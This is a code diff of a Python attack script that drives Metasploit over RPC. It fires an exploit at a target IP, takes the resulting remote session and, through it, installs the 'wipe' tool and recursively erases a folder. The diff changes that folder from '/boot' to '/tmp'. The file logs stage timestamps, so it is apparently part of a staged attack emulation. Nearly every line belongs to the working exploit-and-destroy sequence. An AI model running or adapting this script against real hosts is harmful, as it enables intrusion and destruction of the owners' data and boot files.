@@ -17,8 +17,7 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    # flag_finish = argv[4]
-    wipe_disk_folder = "/boot"
+    wipe_disk_folder = "/tmp"
 
     client = MsfRpcClient('kali')
 
@@ -30,20 +29,15 @@ def main(argv):
     output_time_file = 'time_stage_3_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
-    #print('Start 3')
 
     exploit.execute(payload=payload)
 
     while client.jobs.list:
         time.sleep(1)
 
-    #print(client.sessions.list['4'])
-
     shell = client.sessions.session('4')
     shell.write('apt install wipe -y')
     shell.write("wipe -r -f {0}".format(wipe_disk_folder))
-
-    # print(flag_finish)
 
 
 main(sys.argv)
